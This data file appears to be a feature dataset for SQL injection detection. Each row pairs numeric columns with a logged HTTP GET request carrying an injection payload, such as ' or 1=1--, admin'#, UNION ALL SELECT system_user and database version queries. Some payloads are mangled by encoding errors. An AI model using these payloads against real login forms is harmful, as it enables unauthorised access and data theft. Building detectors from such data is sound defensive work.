87,1,200,7096,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
34,1,200,2546,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
34,1,200,1052,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
34,1,200,4865,7,13,6,2,1,GET login/?id=' or true-- HTTP/1.1
33,1,200,4432,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,6318,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
27,1,200,7535,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
27,1,200,5398,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
25,1,200,6051,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
25,1,200,6506,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
42,1,200,7207,7,11,16,2,1,GET login/?id=')) or (('x'))=(('x HTTP/1.1
18,1,200,6703,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,7345,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,5713,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,7012,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,1097,7,2,4,1,0,GET ?id== HTTP/1.1
31,1,200,1804,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,2246,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,1754,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
58,1,200,3654,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,2668,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,2602,21,16,10,1,1,GET ?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
31,1,200,7314,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
39,1,200,6081,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
39,1,200,5636,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
64,1,200,6342,21,21,10,2,1,GET login/?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
64,1,200,2584,21,21,10,2,1,GET login/?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
50,1,200,4148,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
50,1,200,5325,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
26,1,200,3093,7,4,5,1,0,GET ?id= or 0=0 # HTTP/1.1
33,1,200,2928,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
37,1,200,5702,7,9,12,1,1,GET ?id=admin') or ('1'='1'# HTTP/1.1
37,1,200,4162,7,9,12,1,1,GET ?id=admin') or ('1'='1'# HTTP/1.1
20,1,200,2195,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,6824,7,2,5,1,1,GET ?id=' # HTTP/1.1
20,1,200,1679,7,2,5,1,1,GET ?id=' # HTTP/1.1
36,1,200,3738,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,1092,7,9,11,1,1,GET ?id=admin' or '1'='1'-- HTTP/1.1
31,1,200,6952,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
25,1,200,7191,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
25,1,200,2864,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
25,1,200,3645,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
20,1,200,4484,7,2,4,1,1,GET ?id=' ¡V HTTP/1.1
53,1,200,2197,7,26,7,2,1,GET login/?id=' group by userid having 1=1-- HTTP/1.1
53,1,200,3397,7,26,7,2,1,GET login/?id=' group by userid having 1=1-- HTTP/1.1
38,1,200,7367,7,9,12,2,1,GET login/?id=') or ('1'='1-- HTTP/1.1
25,1,200,2350,7,7,5,2,0,GET login/?id=== HTTP/1.1
26,1,200,6261,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
26,1,200,5066,7,4,7,1,1,GET ?id=' or '' ' HTTP/1.1
33,1,200,6439,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
33,1,200,1485,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
33,1,200,5845,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
33,1,200,2649,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
32,1,200,5595,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,3720,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,6339,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
27,1,200,2149,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
42,1,200,2413,7,14,11,2,1,GET login/?id=admin' or '1'='1'-- HTTP/1.1
36,1,200,6613,7,6,16,1,1,GET ?id=')) or (('x'))=(('x HTTP/1.1
27,1,200,5963,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
27,1,200,7283,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
23,1,200,3752,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
23,1,200,5664,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
26,1,200,2897,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
36,1,200,2209,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,1750,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
33,1,200,5270,7,4,13,1,1,GET ?id=') or ('1'='1'-- HTTP/1.1
26,1,200,6086,7,6,6,1,1,GET ?id= like '%' HTTP/1.1
19,1,200,6213,7,2,5,1,0,GET ?id=== HTTP/1.1
19,1,200,4101,7,2,5,1,0,GET ?id=== HTTP/1.1
25,1,200,7965,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
31,1,200,4084,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
36,1,200,4394,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
20,1,200,1822,7,2,5,1,1,GET ?id=' ' HTTP/1.1
32,1,200,3429,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
26,1,200,2980,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
25,1,200,3446,7,8,3,1,1,GET ?id= or true HTTP/1.1
32,1,200,5803,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
32,1,200,4155,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
32,2,200,5740,7,9,8,2,1,GET login/?id=' or ''&' HTTP/1.1
43,1,200,7836,7,16,9,2,1,GET login/?id=admin'or 1=1 or ''=' HTTP/1.1
40,1,200,1033,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
39,1,200,2463,7,9,13,2,1,GET login/?id=') or ('1'='1'-- HTTP/1.1
47,1,200,4759,7,21,7,1,1,GET ?id=' group by userid having 1=1-- HTTP/1.1
32,1,200,3008,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
38,1,200,3394,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
87,1,200,3983,24,20,8,2,1,GET login/?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
27,1,200,6224,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
41,1,200,5049,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
